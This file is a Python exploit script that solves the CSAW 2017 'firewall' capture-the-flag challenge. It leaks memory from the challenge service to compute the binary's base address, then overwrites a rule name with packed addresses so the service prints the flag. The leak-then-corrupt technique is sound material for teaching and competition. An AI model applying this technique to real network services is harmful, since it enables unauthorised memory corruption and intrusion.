#!/usr/bin/env python
# -*- coding: utf-8 -*-

#
#    firewall.py - Solution for CSAW2017 'firewall' challenge.
#    Copyright (C) 2017 Axel "0vercl0k" Souchet - http://www.twitter.com/0vercl0k
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#

import os
import sys
import socket
import struct

HOST = 'firewall.chal.csaw.io'
PORT = 4141

def recv_until(s, x):
    buff = ''
    while x not in buff:
        buff += s.recv(1)
    return buff

def main(argc, argv):
    print '[*] Connecting..'
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

    print '[*] Entering access token..'
    recv_until(s, 'ENTER SERVICE ACCESS TOKEN: ')
    s.sendall('352762356\n')
    recv_until(s, 'MENU SELECTION: ')

    print '[*] Adding a dummy rule..'
    s.send('1\n')
    recv_until(s, 'ENTER RULE NAME: ')
    s.send('hello\n')
    recv_until(s, 'ENTER RULE PORT: ')
    s.send('1337\n')
    recv_until(s, 'ENTER RULE TYPE: ')
    s.send('TCP\n')
    s.send('\n')
    recv_until(s, 'MENU SELECTION: ')

    print '[*] Leaking shit up..'
    s.send('4\n')
    recv_until(s, 'ENTER RULE NUMBER TO PRINT: ')
    s.send('0\n')
    s.send('\n')
    leak = recv_until(s, 'MENU SELECTION: ')
    idx = leak.find('\x68\xf1')
    leak = leak[idx : idx + 4]
    leak = struct.unpack('<I', leak)[0]
    base = leak - 0xf168
    print '[+] Base is', hex(base)
    flag_address = base + 0x12B31

    print '[*] Corrupting shit up..'
    s.send('2\n')
    recv_until(s, 'ENTER RULE NUMBER TO EDIT: ')
    s.send('0\n')
    recv_until(s, 'ENTER RULE NAME: ')
    rule_name = struct.pack('<I', flag_address) * 7
    s.send(rule_name[1 :] + '\n')
    recv_until(s, 'ENTER RULE PORT: ')
    s.send(str(flag_address >> 16) + '\n')
    recv_until(s, 'ENTER RULE TYPE: ')
    s.send('\n')
    recv_until(s, '| PRESS ENTER TO RETURN TO MENU')
    s.send('\n')
    recv_until(s, '| 1. add firewall rule    |')  
    print s.recv(1024)
    s.close()

if __name__ == '__main__':
    sys.exit(main(len(sys.argv), sys.argv))
